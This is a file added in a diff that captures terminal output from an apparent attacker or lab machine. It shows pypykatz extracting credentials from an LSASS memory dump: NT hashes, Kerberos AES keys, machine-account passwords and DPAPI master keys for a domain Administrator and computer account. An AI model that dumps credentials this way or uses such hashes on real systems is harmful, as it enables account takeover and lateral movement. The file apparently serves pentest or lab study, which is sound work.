@@ -1,0 +1,312 @@
+┌──(hunter㉿KALI-ATK)-[~/Desktop]
+└─$ pypykatz lsa minidump /home/hunter/Desktop/lsass.dmp
+INFO:pypykatz:Parsing file /home/hunter/Desktop/lsass.dmp
+FILE: ======== /home/hunter/Desktop/lsass.dmp =======
+== LogonSession ==
+authentication_id 2868629 (2bc595)
+session_id 0
+username Steve
+domainname WIN-MT4VSSDMUEM
+logon_server WIN-MT4VSSDMUEM
+logon_time 2026-09-08T01:26:47.748219+00:00
+sid S-1-5-21-417477182-1314092214-2911850453-1000
+luid 2868629
+
+== LogonSession ==
+authentication_id 2799833 (2ab8d9)
+session_id 0
+username Steve
+domainname WIN-MT4VSSDMUEM
+logon_server WIN-MT4VSSDMUEM
+logon_time 2026-09-08T01:14:39.685445+00:00
+sid S-1-5-21-417477182-1314092214-2911850453-1000
+luid 2799833
+
+== LogonSession ==
+authentication_id 2132165 (2088c5)
+session_id 0
+username Steve
+domainname WIN-MT4VSSDMUEM
+logon_server WIN-MT4VSSDMUEM
+logon_time 2026-09-07T07:50:26.126965+00:00
+sid S-1-5-21-417477182-1314092214-2911850453-1000
+luid 2132165
+
+== LogonSession ==
+authentication_id 2089050 (1fe05a)
+session_id 0
+username Steve
+domainname WIN-MT4VSSDMUEM
+logon_server WIN-MT4VSSDMUEM
+logon_time 2026-09-07T07:42:38.379309+00:00
+sid S-1-5-21-417477182-1314092214-2911850453-1000
+luid 2089050
+        == Kerberos ==
+                Username: Steve
+                Domain: WIN-MT4VSSDMUEM
+
+== LogonSession ==
+authentication_id 2088986 (1fe01a)
+session_id 0
+username Steve
+domainname WIN-MT4VSSDMUEM
+logon_server WIN-MT4VSSDMUEM
+logon_time 2026-09-07T07:42:38.316505+00:00
+sid S-1-5-21-417477182-1314092214-2911850453-1000
+luid 2088986
+
+== LogonSession ==
+authentication_id 1098082 (10c162)
+session_id 3
+username Administrator
+domainname CORPNET
+logon_server DC01
+logon_time 2026-09-07T06:05:33.425079+00:00
+sid S-1-5-21-1178473647-3107199843-1221911428-500
+luid 1098082
+        == MSV ==
+                Username: Administrator
+                Domain: CORPNET
+                LM: NA
+                NT: 68ff3c71a95d429a3400a5c7c7a45b36
+                SHA1: fa595e86e12cc21eb81b28c64daed692fa1f1fea
+                DPAPI: 3e47a2f65d9c155ebc7ec277a8920f7900000000
+        == WDIGEST [10c162]==
+                username Administrator
+                domainname CORPNET
+                password None
+                password (hex)
+        == Kerberos ==
+                Username: Administrator
+                Domain: CORPNET.LOCAL
+                AES128 Key: 68ff3c71a95d429a3400a5c7c7a45b36
+                AES256 Key: 81bdfb04efbc64504ec9918c85bd153114fb2c8adba9247a9014431093e06082
+        == WDIGEST [10c162]==
+                username Administrator
+                domainname CORPNET
+                password None
+                password (hex)
+
+== LogonSession ==
+authentication_id 1083264 (108780)
+session_id 3
+username UMFD-3
+domainname Font Driver Host
+logon_server 
+logon_time 2026-09-07T06:05:04.347180+00:00
+sid S-1-5-96-0-3
+luid 1083264
+        == MSV ==
+                Username: WIN-MT4VSSDMUEM$
+                Domain: CORPNET
+                LM: NA
+                NT: ebab42c1a10915c2050e7f6640e2c043
+                SHA1: a2b122d239d8bbb6f23da44262bbb5ccd3df58a0
+                DPAPI: 0000000000000000000000000000000000000000
+        == WDIGEST [108780]==
+                username WIN-MT4VSSDMUEM$
+                domainname CORPNET
+                password None
+                password (hex)
+        == Kerberos ==
+                Username: WIN-MT4VSSDMUEM$
+                Domain: corpnet.local
+                Password: 4c002a00260055004e002d002e0065006d005e00270041003c0059004b006100610068005700570076004a00340078005d0045003000270061003200560029005200780061004000220064006e004500730021005b002c0042004f0050004000610059006400770073002a006700420026006d00740047003700580069004b004100360051006d003e0058006d00520073004600650067006c002c004700330021003d0035005a00690068005e005900590076003a003e005300480060005b0042004d00740033006c002900530021005900490060003d004f00670076004f0079004e0064005e00640079003e006000
+                password (hex)4c002a00260055004e002d002e0065006d005e00270041003c0059004b006100610068005700570076004a00340078005d0045003000270061003200560029005200780061004000220064006e004500730021005b002c0042004f0050004000610059006400770073002a006700420026006d00740047003700580069004b004100360051006d003e0058006d00520073004600650067006c002c004700330021003d0035005a00690068005e005900590076003a003e005300480060005b0042004d00740033006c002900530021005900490060003d004f00670076004f0079004e0064005e00640079003e006000
+                AES128 Key: ebab42c1a10915c2050e7f6640e2c043
+                AES256 Key: f9aafe1df94288b3a99a7eb5669ed0a4558636e04aa596655739ff8cf7cead53
+        == WDIGEST [108780]==
+                username WIN-MT4VSSDMUEM$
+                domainname CORPNET
+                password None
+                password (hex)
+
+== LogonSession ==
+authentication_id 996 (3e4)
+session_id 0
+username WIN-MT4VSSDMUEM$
+domainname CORPNET
+logon_server 
+logon_time 2026-09-07T04:16:16.199182+00:00
+sid S-1-5-20
+luid 996
+        == MSV ==
+                Username: WIN-MT4VSSDMUEM$
+                Domain: CORPNET
+                LM: NA
+                NT: ebab42c1a10915c2050e7f6640e2c043
+                SHA1: a2b122d239d8bbb6f23da44262bbb5ccd3df58a0
+                DPAPI: 0000000000000000000000000000000000000000
+        == WDIGEST [3e4]==
+                username WIN-MT4VSSDMUEM$
+                domainname CORPNET
+                password None
+                password (hex)
+        == Kerberos ==
+                Username: win-mt4vssdmuem$
+                Domain: CORPNET.LOCAL
+                AES128 Key: ebab42c1a10915c2050e7f6640e2c043
+                AES256 Key: 9f19acd0cf3ce76bb5976e8950366191dd2d62f8747349c806185c47c64e1aad
+        == WDIGEST [3e4]==
+                username WIN-MT4VSSDMUEM$
+                domainname CORPNET
+                password None
+                password (hex)
+
+== LogonSession ==
+authentication_id 40645 (9ec5)
+session_id 0
+username 
+domainname 
+logon_server 
+logon_time 2026-09-07T04:16:14.026663+00:00
+sid None
+luid 40645
+        == MSV ==
+                Username: WIN-MT4VSSDMUEM$
+                Domain: CORPNET
+                LM: NA
+                NT: ebab42c1a10915c2050e7f6640e2c043
+                SHA1: a2b122d239d8bbb6f23da44262bbb5ccd3df58a0
+                DPAPI: 0000000000000000000000000000000000000000
+
+== LogonSession ==
+authentication_id 2132229 (208905)
+session_id 0
+username Steve
+domainname WIN-MT4VSSDMUEM
+logon_server WIN-MT4VSSDMUEM
+logon_time 2026-09-07T07:50:26.189573+00:00
+sid S-1-5-21-417477182-1314092214-2911850453-1000
+luid 2132229
+        == Kerberos ==
+                Username: Steve
+                Domain: WIN-MT4VSSDMUEM
+
+== LogonSession ==
+authentication_id 2132200 (2088e8)
+session_id 0
+username Steve
+domainname WIN-MT4VSSDMUEM
+logon_server WIN-MT4VSSDMUEM
+logon_time 2026-09-07T07:50:26.158035+00:00
+sid S-1-5-21-417477182-1314092214-2911850453-1000
+luid 2132200
+
+== LogonSession ==
+authentication_id 2102617 (201559)
+session_id 0
+username Steve
+domainname WIN-MT4VSSDMUEM
+logon_server WIN-MT4VSSDMUEM
+logon_time 2026-09-07T07:44:38.316169+00:00
+sid S-1-5-21-417477182-1314092214-2911850453-1000
+luid 2102617
+
+== LogonSession ==
+authentication_id 2089021 (1fe03d)
+session_id 0
+username Steve
+domainname WIN-MT4VSSDMUEM
+logon_server WIN-MT4VSSDMUEM
+logon_time 2026-09-07T07:42:38.347983+00:00
+sid S-1-5-21-417477182-1314092214-2911850453-1000
+luid 2089021
+
+== LogonSession ==
+authentication_id 565834 (8a24a)
+session_id 0
+username Steve
+domainname WIN-MT4VSSDMUEM
+logon_server WIN-MT4VSSDMUEM
+logon_time 2026-09-07T05:10:44.329337+00:00
+sid S-1-5-21-417477182-1314092214-2911850453-1000
+luid 565834
+        == Kerberos ==
+                Username: Steve
+                Domain: WIN-MT4VSSDMUEM
+
+== LogonSession ==
+authentication_id 997 (3e5)
+session_id 0
+username LOCAL SERVICE
+domainname NT AUTHORITY
+logon_server 
+logon_time 2026-09-07T04:16:17.776920+00:00
+sid S-1-5-19
+luid 997
+        == Kerberos ==
+                Username: 
+                Domain: 
+
+== LogonSession ==
+authentication_id 41747 (a313)
+session_id 0
+username UMFD-0
+domainname Font Driver Host
+logon_server 
+logon_time 2026-09-07T04:16:15.698618+00:00
+sid S-1-5-96-0-0
+luid 41747
+        == MSV ==
+                Username: WIN-MT4VSSDMUEM$
+                Domain: CORPNET
+                LM: NA
+                NT: ebab42c1a10915c2050e7f6640e2c043
+                SHA1: a2b122d239d8bbb6f23da44262bbb5ccd3df58a0
+                DPAPI: 0000000000000000000000000000000000000000
+        == WDIGEST [a313]==
+                username WIN-MT4VSSDMUEM$
+                domainname CORPNET
+                password None
+                password (hex)
+        == Kerberos ==
+                Username: WIN-MT4VSSDMUEM$
+                Domain: corpnet.local
+                Password: 4c002a00260055004e002d002e0065006d005e00270041003c0059004b006100610068005700570076004a00340078005d0045003000270061003200560029005200780061004000220064006e004500730021005b002c0042004f0050004000610059006400770073002a006700420026006d00740047003700580069004b004100360051006d003e0058006d00520073004600650067006c002c004700330021003d0035005a00690068005e005900590076003a003e005300480060005b0042004d00740033006c002900530021005900490060003d004f00670076004f0079004e0064005e00640079003e006000
+                password (hex)4c002a00260055004e002d002e0065006d005e00270041003c0059004b006100610068005700570076004a00340078005d0045003000270061003200560029005200780061004000220064006e004500730021005b002c0042004f0050004000610059006400770073002a006700420026006d00740047003700580069004b004100360051006d003e0058006d00520073004600650067006c002c004700330021003d0035005a00690068005e005900590076003a003e005300480060005b0042004d00740033006c002900530021005900490060003d004f00670076004f0079004e0064005e00640079003e006000
+                AES128 Key: ebab42c1a10915c2050e7f6640e2c043
+                AES256 Key: f9aafe1df94288b3a99a7eb5669ed0a4558636e04aa596655739ff8cf7cead53
+        == WDIGEST [a313]==
+                username WIN-MT4VSSDMUEM$
+                domainname CORPNET
+                password None
+                password (hex)
+
+== LogonSession ==
+authentication_id 999 (3e7)
+session_id 0
+username WIN-MT4VSSDMUEM$
+domainname CORPNET
+logon_server 
+logon_time 2026-09-07T04:16:13.104708+00:00
+sid S-1-5-18
+luid 999
+        == WDIGEST [3e7]==
+                username WIN-MT4VSSDMUEM$
+                domainname CORPNET
+                password None
+                password (hex)
+        == Kerberos ==
+                Username: win-mt4vssdmuem$
+                Domain: CORPNET.LOCAL
+                AES128 Key: ebab42c1a10915c2050e7f6640e2c043
+                AES256 Key: 9f19acd0cf3ce76bb5976e8950366191dd2d62f8747349c806185c47c64e1aad
+        == WDIGEST [3e7]==
+                username WIN-MT4VSSDMUEM$
+                domainname CORPNET
+                password None
+                password (hex)
+        == DPAPI [3e7]==
+                luid 999
+                key_guid b3be6e7e-ff51-45ad-a487-aaf022298173
+                masterkey 95dda7f364cfd6b6a3ed820ed27df85117961dab2ac4cdd00a3386871596e76769f4d71b34ce4912b239ab9be34e281bc9ab9f883de3351860455bd549731df3
+                sha1_masterkey 37ac831633cb2e40c477af7336a86a9916bb1762
+        == DPAPI [3e7]==
+                luid 999
+                key_guid 52dd94e4-d90f-431c-806e-8dbc3c367f29
+                masterkey 2073d3f8247dfb4eb9bc38bf77f1de30007c9028ed0aee50d5324ed53564c268fbd8a72423d9405ab8d74cd96cd5747397ef6c2fdaa2c178bd23d0d9a95ddb2e
+                sha1_masterkey 803a5c0cdfbd4d30f18967253846571610978b03
+
+== Errors ==
+ssp_exception_please_report Q291bGQgbm90IGlkZW50aWZ5IHRlbXBsYXRlISBBcmNoaXRlY3R1cmU6IEthdHpTeXN0ZW1BcmNoaXRlY3R1cmUuWDY0IHN5c2luZm8uYnVpbGRudW1iZXI6IDIwMzQ4DQogIEZpbGUgIi9ob21lL2h1bnRlci8ubG9jYWwvc2hhcmUvcGlweC92ZW52cy9weXB5a2F0ei9saWIvcHl0aG9uMy4xMy9zaXRlLXBhY2thZ2VzL3B5cHlrYXR6L3B5cHlrYXR6LnB5IiwgbGluZSAzOTIsIGluIHN0YXJ0CiAgICBzZWxmLmdldF9zc3AoKQogICAgfn5+fn5+fn5+fn5+Xl4KDQogIEZpbGUgIi9ob21lL2h1bnRlci8ubG9jYWwvc2hhcmUvcGlweC92ZW52cy9weXB5a2F0ei9saWIvcHl0aG9uMy4xMy9zaXRlLXBhY2thZ2VzL3B5cHlrYXR6L3B5cHlrYXR6LnB5IiwgbGluZSAzMDIsIGluIGdldF9zc3AKICAgIGRlY190ZW1wbGF0ZSA9IFNzcFRlbXBsYXRlLmdldF90ZW1wbGF0ZShzZWxmLnN5c2luZm8pCg0KICBGaWxlICIvaG9tZS9odW50ZXIvLmxvY2FsL3NoYXJlL3BpcHgvdmVudnMvcHlweWthdHovbGliL3B5dGhvbjMuMTMvc2l0ZS1wYWNrYWdlcy9weXB5a2F0ei9sc2FkZWNyeXB0b3IvcGFja2FnZXMvc3NwL3RlbXBsYXRlcy5weSIsIGxpbmUgNDQsIGluIGdldF90ZW1wbGF0ZQogICAgcmFpc2UgRXhjZXB0aW9uKCdDb3VsZCBub3QgaWRlbnRpZnkgdGVtcGxhdGUhIEFyY2hpdGVjdHVyZTogJXMgc3lzaW5mby5idWlsZG51bWJlcjogJXMnICUgKHN5c2luZm8uYXJjaGl0ZWN0dXJlLCBzeXNpbmZvLmJ1aWxkbnVtYmVyKSkK
